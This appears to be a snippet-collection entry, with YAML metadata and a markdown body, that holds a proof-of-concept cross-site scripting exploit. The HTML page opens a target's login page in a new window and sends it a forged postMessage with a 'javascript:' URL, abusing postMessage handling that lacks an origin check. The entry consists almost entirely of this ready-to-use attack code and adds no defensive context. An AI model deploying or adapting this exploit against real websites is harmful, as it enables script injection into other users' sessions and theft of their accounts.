---
id: 438c30ae-67e4-4aa3-b478-53be750ea4d0
name: Click button to open a new window and execute script
type: command
executor: bash
data: "<html>\n<body>\n    <input type=button value=\"Click Me\" id=\"btn\">\n</body>\n\
  \n<script>\ndocument.getElementById('btn').onclick = function(e){\n    window.poc\
  \ = window.open('http://www.redacted.com/#login');\n    setTimeout(function(){\n\
  \        window.poc.postMessage(\n            {\n                \"sender\": \"\
  accounts\",\n                \"url\": \"javascript:confirm('XSS')\",\n         \
  \   },\n            '*'\n        );\n    }, 2000);\n}\n</script>\n</html>"
output: null
created_at: '2023-04-06T03:56:42.174231+00:00'
updated_at: '2023-04-10T20:21:54.094042+00:00'
---

# Click button to open a new window and execute script

```bash
<html>
<body>
    <input type=button value="Click Me" id="btn">
</body>

<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('http://www.redacted.com/#login');
    setTimeout(function(){
        window.poc.postMessage(
            {
                "sender": "accounts",
                "url": "javascript:confirm('XSS')",
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
```


